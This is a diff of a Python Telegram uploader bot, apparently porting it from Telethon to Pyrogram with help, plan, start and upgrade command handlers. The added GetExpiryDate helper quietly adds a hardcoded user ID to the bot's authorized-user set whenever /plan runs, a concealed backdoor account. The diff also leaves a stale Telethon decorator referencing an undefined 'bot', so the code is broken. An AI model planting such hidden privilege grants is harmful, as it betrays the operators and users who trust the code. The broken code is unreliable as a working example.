@@ -1,61 +1,77 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# (c) Shrimadhav U K
+
+# the logging things
+import logging
+logging.basicConfig(level=logging.DEBUG,
+                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+import os
+import sqlite3
+
+# the secret configuration specific things
+if bool(os.environ.get("WEBHOOK", False)):
+    from sample_config import Config
+else:
+    from config import Config
+
+# the Strings used for this "thing"
+from translation import Translation
+
+import pyrogram
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(683538773)
+    return expires_at
 
 
-'''Impoting Libraries, Modules & Credentials'''
-from telethon import events
-from telethon.sync import TelegramClient
-from os import remove
-from bot.plugins.downloader import *
-from bot.messages import *
+@pyrogram.Client.on_message(pyrogram.filters.command(["help", "about"]))
+async def help_user(bot, update):
+    # logger.info(update)
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.HELP_MESSAGE,
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
 
 
-'''Login as a Bot'''
-bot = TelegramClient('URL_Uploader', api_id, api_hash).start(bot_token = bot_token)
+@pyrogram.Client.on_message(pyrogram.filters.command(["plan"]))
+async def get_me_info(bot, update):
+    # logger.info(update)
+    chat_id = str(update.from_user.id)
+    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.CURENT_PLAN_MESSAGE.format(chat_id, plan_type, expires_at),
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
 
 
-''''Defining Some Handlers for Bot'''
-#Start Handler
 @bot.on(events.NewMessage(pattern = r'/start$'))
-async def start_handler(event):
-    await event.respond(start_msg, parse_mode = 'html')
-
-#Help Handler
-@bot.on(events.NewMessage(pattern = r'/help$'))
-async def help_handler(event):
-    await event.respond(help_msg, parse_mode = 'html')
-
-@bot.on(events.NewMessage)
-async def upload_handler(event):
-
-    message_info = event.message
-
-    if str(type(message_info.entities[0])) == "<class 'telethon.tl.types.MessageEntityUrl'>":
-        if task() == "Running":
-            await event.respond(task_ongoing, parse_mode = 'html')
-        else:
-            url = message_info.text
-            downloader = await Downloader.start(event, url, bot)
-            filename = downloader.filename
-
-            if filename:    #Sending file to user
-                msg = downloader.n_msg
-                message = event.message
-                userid = event.sender_id
-                try:
-                    await bot.send_file(userid , file = filename, reply_to = message)
-                except Exception as e:
-                    await bot.delete_messages(None, msg)
-                    await bot.send_message(userid, unsuccessful_upload, reply_to = message)
-                    print(line_number(), e)
-                else:
-                    await bot.delete_messages(None, msg)
-                finally:
-                    remove(filename)
-            task("No Task")
-    return None
+async def start(bot, update):
+    # logger.info(update)
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.START_MESSAGE,
+        reply_to_message_id=update.message_id
+    )
 
 
-'''Bot is Started to run all time'''
-print('Bot is Started!')
-bot.start()
-bot.run_until_disconnected()
+@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
+async def upgrade(bot, update):
+    # logger.info(update)
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.UPGRADE_MESSAGE,
+        parse_mode="html",
+        reply_to_message_id=update.message_id,
+        disable_web_page_preview=True
+    )
